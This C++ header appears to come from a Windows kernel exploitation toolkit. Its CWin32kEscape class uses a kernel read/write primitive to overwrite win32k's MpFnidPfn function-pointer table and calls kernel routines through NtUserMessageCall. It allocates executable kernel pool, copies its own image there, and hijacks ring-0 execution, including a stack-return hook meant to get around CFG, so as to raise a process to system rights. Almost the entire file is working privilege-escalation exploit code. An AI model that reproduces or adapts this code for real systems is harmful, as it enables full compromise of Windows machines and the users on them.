#pragma once

#include "../usr_common.h"
#include "../undoc/OS.h"
#include "../undoc/win32k.h"
#include "../undoc/ntoskrnl.h"
#include "../user/Window.hpp"

extern "C"
void*
NtUserMessageCall(
	HWND hwnd,//window handle
	size_t fnSelector,//have to be bigger than 0x400
	size_t,
	size_t,
	size_t,
	size_t fnId//index-6 of function from MpFnidPfn table
	);

class CWin32kEscape
{
#define UNUSED_IND 7

#define EX_ALLOCATE_POOL (1)
#define PS_GET_PROCESS_IMAGE_FILE_NAME (2)
#define PS_GET_CURRENT_THREAD_STACK_BASE (3)
#define ACE PS_GET_CURRENT_THREAD_STACK_BASE

#define RELLOCATE(addr, base, target) (void*)(((size_t)(addr) - (size_t)(base)) + (size_t)(target))
	
	using wlist = boost::intrusive::list<CWindow>;
	
	static const size_t DEFAULT_PARAM = 0x401;

	IKernelIo& m_io;
	_ntoskrnl* m_nt;
	_win32k* m_win32k;

	std::unique_ptr<CWindow> m_window;

public:
	CWin32kEscape(
		__in IKernelIo& io,
		__in void* ntoskrnl,
		__in void* win32k = nullptr
		) : m_io(io),
			m_nt(static_cast<decltype(m_nt)>(ntoskrnl)),
			m_win32k(static_cast<decltype(m_win32k)>(win32k)),
			m_window(nullptr)
	{
		auto nt = static_cast<_ntoskrnl*>(const_cast<void*>(ntoskrnl));
		if (!nt)
			return;

		if (m_win32k)
			return;

		CModuleWalker mwalker(m_io, nt->PsLoadedModuleList());
		if (!mwalker.WalkToModule(L"win32k.sys"))
			return;

		m_win32k = static_cast<decltype(m_win32k)>(mwalker->ModuleBaseAddress);
	}

	__checkReturn
	bool
	NtUserMessageCallEscape(
		__in extinterface::CORE_PAYLOAD payloadId
		)
	{
		if (!m_win32k)
			return false;

		if (!PatchMpFnidPfn())
			return false;

		auto pwn_img = TeleportToKernel();
		if (!pwn_img)
			return false;

		extinterface::PACKET packet;
		InitPacket(packet);

#ifdef CFG
		return DoCfgAwareEscape(pwn_img, packet);
#else
		return DoEscape(pwn_img, packet);
#endif
	}

protected:
	__checkReturn
	bool
	PatchMpFnidPfn()
	{
		static const char* fcn[] =
		{
			"ExAllocatePoolWithTag",
			"PsGetProcessImageFileName",
			"PsGetCurrentThreadStackBase"
		};

		CKernelImg nt_img(m_io, m_nt);
		if (!nt_img.UserBase())
			return false;

		for (size_t i = 0; i < _countof(fcn); i++)
		{			
			auto patch = RELLOCATE(nt_img.GetProcAddress(fcn[i]), nt_img.UserBase(), m_nt);
			if (!patch)
				return false;

			if (!m_io.Write(&m_win32k->mpFnidPfn()[UNUSED_IND + i], &patch, sizeof(patch)))
				return false;
		}
		return true;
	}

	__checkReturn
	const void*
	TeleportToKernel()
	{
		m_window.reset(GetRweWindowHandle());
		if (!m_window.get())
			return nullptr;

		CImage pwn_img(CDllModule::ModuleBase());
		mem_t pwn_mem(malloc(pwn_img.SizeOfImage()), free);
		if (!pwn_mem.get())
			return nullptr;

		auto rwe = ExAllocateRwePool(pwn_img.SizeOfImage());
		if (!rwe)
			return nullptr;

		if (!pwn_img.Rellocate(pwn_mem.get(), rwe))
			return nullptr;

		auto status = m_io.Write(
			rwe, 
			pwn_mem.get(), 
			pwn_img.SizeOfImage());

		if (!status)
			return nullptr;

		return rwe;
	}

	__checkReturn
	CWindow*
	GetRweWindowHandle()
	{
		wlist w_list;
		CWindow* wnd = nullptr;

		for (size_t i = 0; i < 0xFFFF; i++)
		{
			wchar_t name[4];
			for (size_t j = 0, val = i; j < _countof(name); j++, val /= 10)
				name[j] = '0' + ((val % 0x10) > 9 ? ('A' - '0' + (val % 10) - 9) : (val % 0x10));

			wnd = new CWindow(name);
			if (!wnd)
				break;

			if (IsWindowHandleRweFlag(wnd->Hwnd()))
				return wnd;

			w_list.push_back(*wnd);
		}
		return nullptr;
	}

	void
	InitPacket(
		__inout extinterface::PACKET& packet
		)
	{
		packet.PayloadId = extinterface::CORE_PAYLOAD::GeekPwn;
		packet.ToSystemBoostProcId = reinterpret_cast<HANDLE>(GetCurrentProcessId());
		//reinterpret_cast<HANDLE>(CProcessInsider::GetProcessId(L"system"));

		memset(&packet.DriverName, 0, sizeof(packet.DriverName));
		memcpy(&packet.DriverName, L"\\Device\\Null", sizeof(L"\\Device\\Null"));
	}

	__checkReturn
	bool
	DoCfgAwareEscape(
		__in const void* kernelImage,
		__inout extinterface::PACKET& packet
		)
	{
		auto stack_base = GetCurrentThreadStackBase();
		if (!stack_base)
			return false;

		auto stack_hook = KiSystemServiceCopyEndStackRet(stack_base, &packet.KiSystemServiceCopyEnd);
		if (!stack_hook)
			return false;

		if (!m_io.Write(static_cast<char*>(stack_base) - sizeof(packet), &packet, sizeof(packet)))
			return false;

		void* ace = RELLOCATE(StackEscape, CDllModule::ModuleBase(), kernelImage);

		//cpl0 exec :
		(void)m_io.Write(stack_hook, &ace, sizeof(ace));

		return true;
	}

	void*
	KiSystemServiceCopyEndStackRet(
		__in void* stackBase,
		__inout void** kiSystemServiceCopyEnd
		)
	{
		void** stack[0x100] = { 0 };
		if (!m_io.Read(static_cast<char*>(stackBase) - sizeof(stack), stack, sizeof(stack)))
			return false;

		size_t KiSystemServiceCopyEnd = 0;
		for (size_t i = 0; !KiSystemServiceCopyEnd && i < _countof(stack); i++)
			if (os::g_sSystemSpace.IsInRange(stack[_countof(stack) - i - 1]))
				KiSystemServiceCopyEnd = _countof(stack) - i - 1;

		if (!KiSystemServiceCopyEnd)
			return nullptr;

		*kiSystemServiceCopyEnd = stack[KiSystemServiceCopyEnd];
		return (static_cast<char*>(stackBase) - ((_countof(stack) - KiSystemServiceCopyEnd) * sizeof(void*)));
	}

	__checkReturn
	bool
	DoEscape(
		__in const void* kernelImage,
		__inout extinterface::PACKET& packet
		)
	{
		auto stack_base = GetCurrentThreadStackBase();
		if (!stack_base)
			return false;

		void* ace = RELLOCATE(SystemMain, CDllModule::ModuleBase(), kernelImage);
		if (!m_io.Write(&m_win32k->mpFnidPfn()[UNUSED_IND + ACE - 1], &ace, sizeof(ace)))
			return false;

		if (!m_io.Write(static_cast<char*>(stack_base) - sizeof(packet), &packet, sizeof(packet)))
			return false;

		//cpl0 exec :
		(void)NtUserMessageCall(m_window->Hwnd(), DEFAULT_PARAM, 0, 0, 0, ACE);
		return true;
	}

private:
	__checkReturn
	void*
	GetCurrentThreadStackBase()
	{
		return NtUserMessageCall(m_window->Hwnd(), DEFAULT_PARAM, 0, 0, 0, PS_GET_CURRENT_THREAD_STACK_BASE);
	}

	__checkReturn
	bool
	IsWindowHandleRweFlag(
		__in HWND hwnd
		)
	{
		size_t ret = reinterpret_cast<size_t>(NtUserMessageCall(hwnd, DEFAULT_PARAM, 0, 0, 0, PS_GET_PROCESS_IMAGE_FILE_NAME));
		if (0 == ((ret - os::GetImageFileNameOffset()) & (os::POOL_COLD_ALLOCATION | os::POOL_NX_ALLOCATION | 0xF)))
			return true;

		return false;
	}

	__checkReturn
	void*
	ExAllocateRwePool(
		__in size_t size
		)
	{
		return NtUserMessageCall(m_window->Hwnd(), size, 0, 0, 0, EX_ALLOCATE_POOL);
	}
};
